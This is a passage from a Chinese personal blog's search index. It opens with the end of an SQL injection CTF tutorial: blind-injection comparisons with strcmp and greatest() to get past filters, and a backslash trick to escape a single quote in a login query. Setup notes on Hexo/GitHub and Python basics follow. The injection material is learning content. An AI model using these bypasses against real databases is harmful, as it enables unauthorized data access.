class="hljs-number">0x70</span><br>strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) = <span class="hljs-number">1</span><br>strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) = <span class="hljs-number">0</span><br>strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) = <span class="hljs-number">-1</span><br><br><span class="hljs-keyword">if</span>函数可用如下语句代替：<br><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> condition <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>比较符（&gt;,&lt;）绕过：</p><p>利用greatest来替代比较符(&lt;,&gt;)</p><p>greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>SQL语句逃逸单引号：</p><p>当sql语句结构为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$pwd&#x27;</span><br></code></pre></td></tr></table></figure><p>我们可以在username哪里输入admin\</p><p>这样sql语句就变为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$pwd&#x27;</span><br></code></pre></td></tr></table></figure><p>所以$pwd’就逃逸出来了，所以我们直接在password那里进行sql语句查询就了</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>其实就是一种根据后台语句进行注入的一种漏洞，做<code>sql</code>注入<code>ctf</code>的时候，我们要去猜测后台<code>sql</code>语句的结构，</p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo + github 搭建博客</title>
    <link href="/2021/04/06/Hexo-github-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/04/06/Hexo-github-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="Hexo-github-搭建博客"><a href="#Hexo-github-搭建博客" class="headerlink" title="Hexo + github 搭建博客"></a>Hexo + github 搭建博客</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>之前用的服务器搭的博客，<code>wordpress</code>，懂得都懂，太难看了，就搭了个<code>github</code>，随便让以后的学弟能更方便得搭建吧</p><h3 id="GIT安装"><a href="#GIT安装" class="headerlink" title="GIT安装"></a>GIT安装</h3><p>直接去官网下载最新版本，<code>https://git-scm.com/downloads</code>,下载完之后可以通过cmd查看版本，就可以检测是否安装成功</p><p><img src="https://z3.ax1x.com/2021/04/06/c1szXF.png" alt="aaa"></p><h3 id="Node-js安装"><a href="#Node-js安装" class="headerlink" title="Node.js安装"></a>Node.js安装</h3><p>去官网下载，<code>https://nodejs.org/en/</code>，下载完之后需要添加一下环境，安装完先查看一下版本：</p><p><img src="https://z3.ax1x.com/2021/04/06/c1yZ6O.png" alt="bbb"></p><p>这里的环境配置主要配置的是<code>npm</code>安装的全局模块所在的路径</p><p>之所以要配置，是因为以后在执行类似：<code>npm install express [-g]</code>的安装语句时，会将安装的模块安装到<code>【C:\Users\用户名\AppData\Roaming\npm】</code>路径中，占C盘空间。</p><p>所以在安装目录下创建两个文件夹【node_global】及【node_cache】如下图：</p><p><img src="https://z3.ax1x.com/2021/04/06/c1yG1f.png" alt="ccc"></p><p>　1、设置全局目录和缓存目录，创建完两个空文件夹之后，打开cmd命令窗口，输入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">npm<span class="hljs-built_in"> config </span><span class="hljs-builtin-name">set</span><span class="hljs-built_in"> prefix </span><span class="hljs-string">&quot;D:\Node14.16.0\node_global&quot;</span><br><br>npm<span class="hljs-built_in"> config </span><span class="hljs-builtin-name">set</span> cache <span class="hljs-string">&quot;D:\Node14.16.0\node_cache&quot;</span><br></code></pre></td></tr></table></figure><p>然后就在<code>C:\user\5087</code>生成了<code>.npmrc</code></p><p>　2、设置环境变量，先在系统变量新建<code>NODE_PATH</code>，输入<code>D:\Node14.16.0\node_modules</code>，然后将用户变量下的<code>Path</code>修改为<code>D:\Node14.16.0\node_global</code></p><p>环境就搭建好了</p><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>通过<code>Git</code>命令行执行：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">npm install -g hexo-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure><p>然后自己随便在一个位置创建一个文件夹，例如<code>Blog</code></p><p><code>cmd</code>进入该路径，执行命令</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">hexo <span class="hljs-keyword">init</span> blog<br></code></pre></td></tr></table></figure><p>可以发现<code>Blog</code>里面生成了<code>blog</code>文件夹了，结构如下：</p><p><img src="https://z3.ax1x.com/2021/04/06/c16N26.png" alt="ccc"></p><p>接着在<code>cmd</code>里面执行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p>就可以访问<code>http://localhost:4000</code>，就可以看到Hexo的主题了</p><p>然后自己可以在网上寻找一些主题下载到<code>blog\themes</code>里面</p><p>然后再在<code>_config.yml</code>里面修改主题，我使用的是<code>fluid</code></p><p><img src="https://z3.ax1x.com/2021/04/06/c16zdJ.png" alt="eee"></p><h3 id="配置SSH密钥"><a href="#配置SSH密钥" class="headerlink" title="配置SSH密钥"></a>配置SSH密钥</h3><p>为了使本地可以跟远程的<code>github</code>建立联系，需要在本地配置SSH密钥，这样我们就可以在本地直接提交代码到<code>GitHub</code>上。</p><p>如果你是第一次配置SSH，则配置一下git的username 和 email</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs verilog">$ git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.name</span> <span class="hljs-string">&quot;你要设置的名字&quot;</span><br>$ git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.email</span> <span class="hljs-string">&quot;你要设置的邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>之后生成SSH密钥：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ssh-keygen -t rsa -C <span class="hljs-string">&quot;你刚刚设置的邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>在这之后会得到两个文件：<code>id_rsa</code>和<code>id_rsa.pub</code><br>找到<code>id_rsa.pub</code>文件，用记事本打开，复制其内容。路径：<code>C:\Users\J（你的用户名）\.ssh</code></p><p><img src="https://z3.ax1x.com/2021/04/06/c12YPs.png" alt="jjj"></p><p>然后在<code>github</code>里面添加SSH密钥</p><p><img src="https://z3.ax1x.com/2021/04/06/c120qU.png" alt="kkk"></p><p>在SSH里面</p><p><img src="https://z3.ax1x.com/2021/04/06/c12gR1.png" alt="lll"></p><p><code>Title</code>随便取，<code>Key</code>即刚才复制的密钥</p><p>完成之后测试一下，在git bash输入：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ssh -T git<span class="hljs-variable">@github</span>.com<br></code></pre></td></tr></table></figure><p>得到下面这个即为成功</p><p><img src="https://z3.ax1x.com/2021/04/06/c12HJA.png" alt="zzz"></p><h3 id="关联github"><a href="#关联github" class="headerlink" title="关联github"></a>关联github</h3><p>先注册一个账号，名字要取喜欢的，后面要用到，然后创建一个仓库，<code>repositories</code>，这里我就先用免费的域名，购买的后面再讲</p><p><img src="https://z3.ax1x.com/2021/04/06/c1cDyT.png" alt="fff"></p><p>这个白色框框里面就填写<code>你的用户名.github.io</code>（这就是github里面免费的二级域名），仓库建好，去<code>settings</code></p><p><img src="https://z3.ax1x.com/2021/04/06/c1gaHe.png" alt="ggg"></p><p>初始化一个主题</p><p><img src="https://z3.ax1x.com/2021/04/06/c1gv59.png" alt="hhh"></p><p>然后你就可以访问<code>你的用户名.github.io</code>，就可以看到这里设置的主题了</p><p>登录<code>GitHub</code>，打开之前新建好的仓库<code>username.github.io</code>，复制地址，选择SSH类型</p><p>打开本地站点配置文件，如<code>D:/blog/blog</code>（你的hexo根目录）下的<code>_config.yml</code>配置文件。</p><p>这里整个项目有两个<code>_config.yml</code>文件。</p><p>一个是位于你的<code>hexo</code>根目录下面的，叫做<code>站点配置</code>文件。</p><p>另一个是位于你的主题文件夹目录下面的，叫做<code>主题配置</code>文件。</p><p>这里打开<code>站点配置</code>文件，找到<code>deploy</code>，</p><p><img src="https://z3.ax1x.com/2021/04/06/c1RKY9.png" alt="xxx"></p><p>将<code>repo</code>替换成你的<code>GitHub</code>仓库的SSH链接即可。</p><p>然后需要安装一下<code>git</code>环境，在<code>git bush</code>执行</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>然后就<code>cmd</code>进入<code>blog</code>目录</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/04/06/c1RrOf.png" alt="vvv"></p><p>然后你就可以访问你的仓库地址了</p><p>我这里遇到一个大坑，就是什么都好了，但就是访问不了，百度了很久，最后还是解决了：</p><p>删除掉<code>.deploy_git</code>文件夹，然后<code>hexo clean ,hexo g -d</code>就好了</p>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python基础知识</title>
    <link href="/2021/04/06/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2021/04/06/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="python基础知识"><a href="#python基础知识" class="headerlink" title="python基础知识"></a>python基础知识</h2><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ol><li><p>安装第三方库</p><p><code>python3 -m pip install flask_waf</code></p></li><li><p>Python标准库常见模块</p><p>python解释器相关：sys</p><p>操作系统：os</p><p>json加载生成：json</p><p>正则表达式：re</p><p>随机数：random</p><p>多线程：multiprocessing</p><p>爬虫：bs4</p></li><li><p>Python第三方开源库常见模块（需安装）</p><p>网页爬取：scrapy、requests、BeautifulSoup</p><p>WEB服务：django、flask</p><p>数据库：PyMySQL、redis</p><p>Excel读写：xlrd、xlwt</p><p>大数据：PySpark</p><p>数据计算：numpy、scipy</p><p>图表展示：matplotlib</p><p>机器学习：scikit-learn</p><p>深度学习：百度PaddlePaddle、谷歌TensorFlow</p></li></ol><h3 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h3><ol><li><p>HTTP请求方式：</p><p><code>request.get</code>   <code>request.post</code>  …</p></li><li><p>传递参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;...&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;w0s1np&#x27;</span>,<br>    <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">18</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Request Method&#x27;</span>:<span class="hljs-string">&#x27;Get&#x27;</span><br>&#125;<br>r = requests.get(<span class="hljs-string">&#x27;url&#x27;</span>, params = data,headers = headers)<br></code></pre></td></tr></table></figure></li><li><p>响应网页内容：</p><p><code>r.text</code>   <code>r.content #会自动为你解码 gzip 和 deflate 压缩,是http响应内容的二进制形式</code></p></li><li><p>网页状态码：</p><p><code>r.status_code</code></p></li><li><p>响应头headers：</p><p><code>r.headers</code></p></li><li><p>响应内容编码方式：</p><p><code>r.encoding #从http的header中猜测的响应内容编码方式</code>   <code>r.apparent_encoding  #从内容中分析出响应的内容编码方式</code></p></li><li><p>设置IP代理：</p><p>目的就是有的网站反爬机制会限制单位时间内同一IP的请求次数，我们可以通过设置 IP proxy代理来应对这个反爬机制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;...&#x27;</span><br>proxies = &#123;<br>  <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&#x27;http://...&#x27;</span>,<br>  <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&#x27;http://...&#x27;</span>,<br>&#125;<br><br>requests.get(<span class="hljs-string">&#x27;url&#x27;</span>, proxies=proxies)<br></code></pre></td></tr></table></figure></li><li><p>cookie问题：</p><p>查看<code>cookie</code>：<code>response.cookies</code></p><p>添加<code>cookie</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;...&#x27;</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&#x27;</span><br>&#125;<br><br>cookies = &#123;<span class="hljs-string">&#x27;cookie_name&#x27;</span>: <span class="hljs-string">&#x27;cookie_value&#x27;</span>, &#125;<br>response = requests.get(url, headers = headers, cookies = cookies)<br></code></pre></td></tr></table></figure></li><li><p>session问题：</p><p>为了保持会话的连续，我们一般先创建一个session对象，用它打开一个url</p><p>每当我们使用这个<code>session</code>对象重新打开一个<code>url</code>时，请求头都会带上首次产生的<code>cookie</code>,实现了会话的延续。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;...&#x27;</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&#x27;</span><br>&#125;<br><br>r = requests.session()<br>response = r.get(url, headers = headers)<br></code></pre></td></tr></table></figure><h3 id="SYS模块"><a href="#SYS模块" class="headerlink" title="SYS模块"></a>SYS模块</h3><p>sys模块主要是针对与Python解释器相关的变量和方法，不是主机操作系统。</p><ol><li><p>sys.argv</p><p>sys.argv是一个脚本执行参数列表，列表的第一个元素是脚本名称，从第二个元素开始才是真正的参数。</p></li><li><p>sys.path</p><p>sys.path 类型为list，模块的搜索路径，第一个元素是当前目录，意思是每次会首先搜索当前目录下的模块，用户在程序中可以自己修改sys.path，设置自己的模块搜索路径</p></li><li><p>sys.exit(n) </p><p>sys.exit(n) 退出程序，n等于0代表正常退出，不等于0代表异常退出，在shell可以用$?获得退出值。</p></li></ol><h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>负责程序与操作系统交互，提供访问操作系统底层的接口</p><p>负责程序与操作系统交互，提供访问操作系统底层的接口</p><p>os.environ 字典类型，读取系统环境变量</p><p>os.remove(path) 删除文件</p><p>os.rename(src,dst) 重命名文件或目录，可实现文件移动</p><p>os.mkdir(dir) 创建目录</p><p>os.rmdir(dir) 删除目录，目录必须为空</p><p>os.listdir(path) 返回列表，列出目录下的文件和目录</p><p>os.path.basename(path) 提取路径参数中的文件名</p><p>os.path.dirname(path) 提取路径参数中的目录名</p><p>os.path.split(path) 拆分path为(目录名, 文件名)</p><p>os.path.splitext(path) 拆分path(文件名, 后缀名)</p><p>os.path.exists(path) 判断指定的文件或目录是否存在</p><p>os.path.isdir(path) 判断path参数是否是目录</p><p>os.path.isfile(path) 判断path参数是否是普通文件</p><h3 id="threading-库·"><a href="#threading-库·" class="headerlink" title="threading 库·"></a>threading 库·</h3><p>进程是一段程序，类似于浏览器或者视频播放器</p><p>线程是每个进程的实际运算单元，相当于视频播放器能够同时播放声音和视频</p><p>Python中使用线程有两种方式：函数或者用类来包装线程对象。</p><ol><li><p>函数式：调用thread模块中的start_new_thread()函数来产生新线程。语法如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">thread.start_new_thread ( function, args[, kwargs] )<br></code></pre></td></tr></table></figure><ul><li>function - 线程函数。</li><li>args - 传递给线程函数的参数,他必须是个tuple类型。</li><li>kwargs - 可选参数。</li></ul></li></ol><p>threading 库提供了 Thread 这一个类，可以创建这一个类的实例进行使用，下面是使用方法：</p><h3 id="Queue模块"><a href="#Queue模块" class="headerlink" title="Queue模块"></a>Queue模块</h3><p>提供了同步的、线程安全的队列类，包括FIFO（先入先出)队列Queue，LIFO（后入先出）队列LifoQueue，和优先级队列PriorityQueue。这些队列都实现了锁原语，能够在多线程中直接使用。可以使用队列来实现线程间的同步。</p><p>Queue模块中的常用方法:</p><ul><li>Queue.qsize() 返回队列的大小</li><li>Queue.empty() 如果队列为空，返回True,反之False</li><li>Queue.full() 如果队列满了，返回True,反之False</li><li>Queue.full 与 maxsize 大小对应</li><li>Queue.get([block[, timeout]])获取队列，timeout等待时间</li><li>Queue.get_nowait() 相当Queue.get(False)</li><li>Queue.put(item) 写入队列，timeout等待时间</li><li>Queue.put_nowait(item) 相当Queue.put(item, False)</li><li>Queue.task_done() 在完成一项工作之后，Queue.task_done()函数向任务已经完成的队列发送一个信号</li><li>Queue.join() 实际上意味着等到队列为空，再执行别的操作 </li></ul><h3 id="bs4库"><a href="#bs4库" class="headerlink" title="bs4库"></a>bs4库</h3><p>Beautiful Soup 库一般被称为bs4库，支持Python3</p><p> <code>bs4</code>库把<code>html</code>源代码重新进行了格式化，就是把<code>html</code>源码转换为树形，好看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>soup = BeautifulSoup(<span class="hljs-string">&quot;&lt;html&gt;A Html Text&lt;/html&gt;&quot;</span>, <span class="hljs-string">&quot;html.parser&quot;</span>)<br></code></pre></td></tr></table></figure><p>两个参数：第一个参数是要解析的<code>html</code>文本，第二个参数是使用那种解析器，对于<code>HTML</code>来讲就是<code>html.parser</code>，这个是<code>bs4</code>自带的解析器。</p><p>输出：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">soup.prettify()  <span class="hljs-meta"># prettify 有括号和没括号都可以</span><br></code></pre></td></tr></table></figure><p><code>sopu.find_all</code> ：根据标签查找需要的，<code>sopu.find_all(class = &#39;topic-title&#39;)</code>这里就是寻找<code>class</code>标签为<code>topic-title</code>的内容</p><p><code>soup.attrs</code>：获取<code>soup</code>对象的属性，<code>sopu.attrs[&#39;href&#39;]</code>，这里就是获取<code>soup</code>对象的<code>href</code>属性</p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p>在学<code>python</code>过程中难免会遇到无数的报错，但是只要我们能看报错在依次解决，编程能力就会提高</p><ol><li><p>在使用<code>requests</code>库爬先知的时候</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;https://xz.aliyun.com/&#x27;</span><br>r = requests.get(url)<br>r.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>html = r.text<br><span class="hljs-built_in">print</span>(html)<br></code></pre></td></tr></table></figure><p>遇到报错：<code>HTTPSConnectionPool(host=&#39;xz.aliyun.com&#39;, port=443): Max retries exceeded with url: / (</code></p><p>就几行代码，报错几十行，百度了很久，大部分都是<code>r = requests.get(url,verify=False)</code>，或者安装下面几个包</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip3 <span class="hljs-keyword">install</span> cryptography<br>pip3 <span class="hljs-keyword">install</span> pyOpenSSL<br>pip3 <span class="hljs-keyword">install</span> certifi<br></code></pre></td></tr></table></figure><p>我都尝试了，无果，我就在想是不是我的代理有问题呢，我把代理关闭之后，再访问，报错就变化了，只有一行，并且指出了问题解决的网址</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">D:\PYTHON3\lib\site-packages\urllib3\connectionpool.<span class="hljs-keyword">py</span>:<span class="hljs-number">1013</span>: InsecureRequestWarnin<span class="hljs-variable">g:</span> Unverified HTTPS request <span class="hljs-keyword">is</span> being made <span class="hljs-keyword">to</span> host <span class="hljs-string">&#x27;xz.aliyun.com&#x27;</span>. Adding certificate verification <span class="hljs-keyword">is</span> strongly advised. See: http<span class="hljs-variable">s:</span>//urllib3.readthedocs.io/<span class="hljs-keyword">en</span>/latest/advanced-usage.html#ssl-warnings<br>  warnings.warn(<br></code></pre></td></tr></table></figure><p>就去该网址查看原因，大概就是<code>TLS Warnings</code>，再执行以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-meta">&gt;&gt;&gt; </span>urllib3.disable_warnings()<br></code></pre></td></tr></table></figure><p>运行之后，就可以了，直接使用以下代码就可以爬了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;https://xz.aliyun.com/&#x27;</span><br>r = requests.get(url)<br>r.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>html = r.text<br><span class="hljs-built_in">print</span>(html)<br></code></pre></td></tr></table></figure><p>最后总结一下：就是设置的代理有问题，我现在设置代理之后就报错，关闭代理就可以正常运行</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/04/06/hello-world/"/>
    <url>/2021/04/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
